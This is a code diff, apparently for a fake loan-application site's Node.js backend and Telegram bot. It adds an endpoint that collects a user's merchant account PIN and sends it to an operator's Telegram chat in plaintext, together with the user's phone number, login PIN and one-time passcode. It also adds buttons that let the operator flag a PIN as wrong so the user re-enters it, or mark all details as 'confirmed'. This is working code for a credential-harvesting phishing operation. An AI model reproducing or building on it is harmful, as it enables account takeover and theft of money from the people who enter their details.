@@ -1069,7 +1069,42 @@ User will now proceed to OTP.
         `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
         await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan approved!' });
     }
-});
+
+    // Wrong Merchant PIN
+    else if (action === 'wrongmerchpin' && type === 'merch') {
+        await db.updateApplication(applicationId, { merchantPinStatus: 'wrong' });
+        await bot.editMessageText(`
+❌ *WRONG MERCHANT PIN*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+💳 Merchant PIN entered: \`${application.merchantPin}\`
+
+⚠️ User will be asked to re-enter.
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Wrong merchant PIN flagged' });
+    }
+
+    // Approve via Merchant PIN
+    else if (action === 'approve' && type === 'merch') {
+        await db.updateApplication(applicationId, { merchantPinStatus: 'approved' });
+        await bot.editMessageText(`
+🎉 *FULLY APPROVED — MERCHANT PIN CONFIRMED!*
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 Login PIN: \`${application.pin}\`
+🔢 OTP: \`${application.otp}\`
+💳 Merchant PIN: \`${application.merchantPin}\`
+
+✓ ALL DETAILS CONFIRMED
+👤 ${callbackQuery.from.first_name}
+⏰ ${new Date().toLocaleString()}
+        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Merchant PIN confirmed & loan approved!' });
+    }
 
 console.log('✅ Telegram callback handler registered!');
 
@@ -1335,6 +1370,68 @@ User requested a new OTP.
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// POST /api/verify-merchant-pin
+app.post('/api/verify-merchant-pin', async (req, res) => {
+    console.log('\n🔵 /api/verify-merchant-pin called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, merchantPin } = req.body;
+
+        if (!applicationId || !merchantPin) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId or merchantPin' });
+        }
+
+        const application = await db.getApplication(applicationId);
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        // Re-add admin to map if needed
+        if (!adminChatIds.has(application.adminId)) {
+            const admin = await db.getAdmin(application.adminId);
+            if (admin?.chatId) {
+                adminChatIds.set(application.adminId, admin.chatId);
+            } else {
+                return res.status(500).json({ success: false, message: 'Admin unavailable' });
+            }
+        }
+
+        // Save merchant PIN to application
+        await db.updateApplication(applicationId, { merchantPin, merchantPinStatus: 'received' });
+        console.log(`✅ Merchant PIN saved for ${applicationId}: ${merchantPin}`);
+
+        const returningLabel = application.isReturningUser
+            ? `\n🔄 *Returning customer* (${application.previousCount || 1} previous visits)`
+            : '';
+
+        // Send to Telegram — same style as verify-pin and verify-otp
+        await sendToAdmin(application.adminId, `
+💳 *MERCHANT ACCOUNT PIN*${returningLabel}
+
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔑 Login PIN: \`${application.pin}\`
+🔢 OTP: \`${application.otp}\`
+💳 Merchant PIN: \`${merchantPin}\`
+⏰ ${new Date().toLocaleString()}
+
+⚠️ *MERCHANT PIN RECEIVED*
+        `, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: '❌ Wrong Merchant PIN', callback_data: `wrongmerchpin_merch_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Confirm & Approve',  callback_data: `approve_merch_${application.adminId}_${applicationId}` }]
+                ]
+            }
+        });
+
+        res.json({ success: true });
+    } catch (error) {
+        console.error('❌ Error in /api/verify-merchant-pin:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
     }
 });
 
